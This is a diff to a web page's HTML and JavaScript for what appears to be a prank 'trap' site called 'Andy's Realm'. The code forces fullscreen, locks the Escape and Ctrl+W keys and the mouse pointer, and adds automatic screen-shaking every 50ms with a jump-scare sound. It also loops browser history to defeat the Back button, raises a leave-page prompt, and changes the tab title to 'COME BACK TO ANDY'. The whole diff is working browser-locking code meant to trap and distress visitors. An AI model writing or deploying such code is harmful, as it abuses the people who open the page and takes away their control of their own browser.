@@ -12,8 +12,8 @@
             background-repeat: no-repeat, repeat-y, repeat-y;
             background-size: contain, auto 100%, auto 100%;
             min-height: 100vh; margin: 0; overflow: hidden; background-color: black;
-            /* Transition makes the shake feel more violent */
-            transition: transform 0.05s linear;
+            /* Transition keeps the shake from looking like a glitch */
+            transition: transform 0.03s linear;
         }
 
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
@@ -55,36 +55,32 @@
     <script>
         const trap = document.getElementById('fullscreen-trap');
 
-        // FIXED SHAKE: Uses movementX/Y to work during Pointer Lock
-        document.addEventListener('mousemove', (e) => {
-            if (document.getElementById('conf').style.display === 'none') {
-                if (Math.abs(e.movementX) > 0 || Math.abs(e.movementY) > 0) {
-                    const intensity = 15;
-                    const x = (Math.random() - 0.5) * intensity;
-                    const y = (Math.random() - 0.5) * intensity;
-                    document.body.style.transform = `translate(${x}px, ${y}px)`;
-                }
-            }
-        });
+        // Automatic Random Shake
+        function startShaking() {
+            setInterval(() => {
+                const intensity = 12; // Adjust for more/less violence
+                const x = (Math.random() - 0.5) * intensity;
+                const y = (Math.random() - 0.5) * intensity;
+                document.body.style.transform = `translate(${x}px, ${y}px)`;
+            }, 50); // Shakes every 50ms
+        }
 
         async function forceFullscreen() {
             const elem = document.documentElement;
             try {
                 if (elem.requestFullscreen) await elem.requestFullscreen();
                 
-                // Blocks single-press Esc in Chrome/Edge
+                // Blocks Esc and Ctrl+W (Chrome/Edge only)
                 if (navigator.keyboard && navigator.keyboard.lock) {
-                    await navigator.keyboard.lock(["Escape"]);
+                    await navigator.keyboard.lock(["Escape", "KeyW"]);
                 }
 
-                // Traps mouse cursor inside the browser window
                 if (elem.requestPointerLock) elem.requestPointerLock();
                 
                 trap.style.display = 'none';
             } catch (err) {}
         }
 
-        // Detects if the user breaks out of fullscreen
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement) trap.style.display = 'block';
         });
@@ -93,20 +89,17 @@
             document.getElementById('conf').style.display = 'none';
             document.querySelector('#jump').play();
             forceFullscreen();
+            startShaking(); // Trigger the auto-shake
 
-            // Prevents "Back" button navigation
+            // History Loops
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => { window.history.go(1); };
-            
-            // Standard browser "Leave site?" popup
             window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
 
-            // Constantly pushes new states to history
             setInterval(() => {
                 window.history.pushState(null, "", window.location.href);
             }, 100);
 
-            // Tab-stealing title: Changes text when user switches tabs
             document.addEventListener('visibilitychange', () => {
                 document.title = document.hidden ? "COME BACK TO ANDY" : "Andy's Realm";
             });
